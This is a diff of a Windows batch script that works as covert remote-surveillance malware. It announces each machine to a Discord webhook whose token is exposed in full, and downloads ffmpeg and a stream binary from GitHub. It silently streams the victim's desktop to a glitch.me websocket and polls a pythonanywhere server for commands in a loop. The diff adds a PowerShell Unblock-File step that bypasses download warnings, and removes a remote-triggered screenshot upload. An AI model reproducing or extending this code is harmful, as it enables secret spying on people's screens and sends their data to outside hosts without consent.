@@ -1,5 +1,4 @@
 @echo off
-setlocal EnableDelayedExpansion
 set "apiRoot=https://skollol.pythonanywhere.com"
 set /p name=<name.txt
 set "webhook=https://discord.com/api/webhooks/1341011448331112468/L1SNbktBvHcZmabBiTs5bh_AUXK3buMwGuZ3PynrIwpiyLAFo6y2U42KugzdaIu3PNBw"
@@ -10,6 +9,7 @@ curl -d content="**%name%**: Online" %webhook%
 if not exist "%cd%\ffmpeg.exe" (
     curl -d content="**%name%**: ffmpeg not found, downloading..." %logging%
     curl -L -o ffmpeg.exe "https://github.com/skollol/e/releases/download/depend/ffmpeg.exe"
+    powershell -Command "Unblock-File -Path '%cd%\stream.exe'"
     curl -d content="**%name%**: Downloaded ffmpeg" %logging%
 ) else (
     curl -d content="**%name%**: Found ffmpeg" %logging%
@@ -28,21 +28,7 @@ if not exist "%cd%\stream.exe" (
 start /B "" "%cd%\stream.exe" "%name%" ws://tricky-three-piper.glitch.me -f gdigrab -framerate 5 -i desktop -draw_mouse 1 -c:v mjpeg -q:v 7 -f image2pipe -
 curl -d content="**%name%**: Stream is running." %logging%
 
-for /f "delims=" %%i in ('curl -s "%apiRoot%/conf/ping"') do set "waitTime=%%i"
-
 :loop
-for /f "delims=" %%i in ('curl -s -X POST -d "name=%name%" "%apiRoot%/u"') do set "result=%%i"
-
-if "%result%"=="ss" (
-    if exist ss.webp del ss.webp
-    ffmpeg -f gdigrab -i desktop -draw_mouse 1 -vframes 1 ss.webp
-    if exist ss.webp (
-        curl -d content="**%name%**: Captured a screenshot" %logging%
-        curl -s -X POST -F "name=%name%" -F "image=@ss.webp" "%apiRoot%/ss"
-    ) else (
-        curl -d content="**%name%**: Error capturing screenshot" %logging%
-    )
-)
-
-timeout /t %waitTime% /nobreak >nul
+curl -s -X POST -d "name=%name%" "%apiRoot%/u"
+timeout /t 30 /nobreak >nul
 goto loop
